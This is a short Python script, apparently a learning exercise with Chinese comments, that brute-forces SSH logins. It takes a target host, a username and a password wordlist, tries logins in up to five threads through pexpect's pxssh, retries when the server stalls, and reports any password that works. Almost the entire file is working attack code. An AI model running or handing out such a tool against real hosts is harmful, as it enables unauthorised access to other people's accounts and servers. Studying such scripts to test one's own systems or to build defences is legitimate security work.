#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-06-14 16:50:24
# @Author  : Law Paul (peicx@outlook.com)
# @Link    : http://github.com/peicx
# @Version : $Id$

from pexpect import pxssh
from threading import *
import argparse
import time

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):

    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        # 找到密码后，Found设为True，便于主程序停止
        Found = True
    except Exception as e:
        # 如果提示服务器被刷爆了，则挂起5秒后再次尝试该密码
        if 'read_nonblocking' in str(e):
            # 记录尝试次数，最多尝试5次
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        # 提示命令提示符提取困难，挂起一秒后再尝试该密码
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False)
        # 打印错误密码
        # else:
        #     print('[-] Wrong Password: ' + password)

    finally:
        # release保证了只有不是由connect递归调用的函数，才能释放锁
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser(description='Bructe force crack SSH code')
    parser.add_argument('-H', dest='tgtHost', type=str,
                        help='specify target host')
    parser.add_argument('-F', dest='passwdFile', type=str,
                        help='specify password file')
    parser.add_argument('-u', dest='user', type=str,
                        help='specify the user')
    options = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host is None or passwdFile is None or user is None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        # 这个锁保证了最多只能有5个线程同时进行
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()
